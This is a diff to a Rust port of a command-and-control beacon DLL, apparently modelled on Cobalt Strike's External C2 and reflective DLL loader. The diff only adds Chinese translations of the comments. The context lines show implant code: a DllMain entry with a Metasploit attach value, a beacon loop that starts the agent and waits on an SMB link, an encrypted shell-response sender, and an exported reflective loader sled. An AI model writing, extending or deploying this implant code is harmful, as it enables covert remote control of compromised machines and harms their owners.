@@ -1,5 +1,7 @@
+//! 外部 C2 Beacon DLL 入口（对应 beacon_extc2.cpp + ReflectiveDll.cpp）。
 //! External C2 Beacon DLL entry (mirrors beacon_extc2.cpp + ReflectiveDll.cpp).
 
+//! `adjust`/`length` 循环变量与 `shell_callback` 镜像严格遵循 C++ 入口点。
 //! The `adjust`/`length` loop variables and `shell_callback`
 //! mirrors follow the C++ entry points verbatim.
 #![allow(unused_assignments)]
@@ -17,6 +19,7 @@ use beacon_core::thread::safe_exit;
 
 const DLL_METASPLOIT_ATTACH: u32 = 0x04;
 
+/// 向客户端通道发送加密并封装好的响应。
 /// Sends an encrypted+packaged response to the client channel.
 fn shell_post(buffer: &[u8], length: usize, type_: i32, _send_now: bool) {
     let Some(cipherdata) = command_shell_encrypt(buffer, length, type_) else {
@@ -42,10 +45,12 @@ fn beacon_loop(_lp_reserved: *mut core::ffi::c_void) {
     let buffer_len = buffer.len();
     agent_init(&mut buffer, buffer_len);
 
+    // 启动 SMB Beacon 代码
     // kick off the SMB Beacon code
     command_link_wait();
 }
 
+/// DllMain（ReflectiveDll.cpp）。
 /// DllMain (ReflectiveDll.cpp).
 #[no_mangle]
 pub unsafe extern "system" fn DllMain(
@@ -87,6 +92,7 @@ pub unsafe extern "system" fn DllMain(
     return 1;
 }
 
+/// ReflectiveLoader sled（相当于 ReflectiveLoader.5k，共 5120 字节）。
 /// ReflectiveLoader sled (ReflectiveLoader.5k equivalent, 5120 bytes).
 #[no_mangle]
 pub static ReflectiveLoader: [u8; 5120] = build_sled();
